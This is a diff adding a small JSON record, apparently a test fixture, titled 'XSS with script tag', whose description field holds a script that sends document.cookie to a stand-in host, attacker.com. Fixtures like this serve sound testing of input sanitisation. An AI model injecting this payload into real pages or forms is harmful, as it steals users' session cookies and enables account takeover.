@@ -1,0 +1,4 @@
+{
+  "title": "XSS with script tag",
+  "description": "<script>fetch('http://attacker.com?c='+document.cookie)</script>"
+}
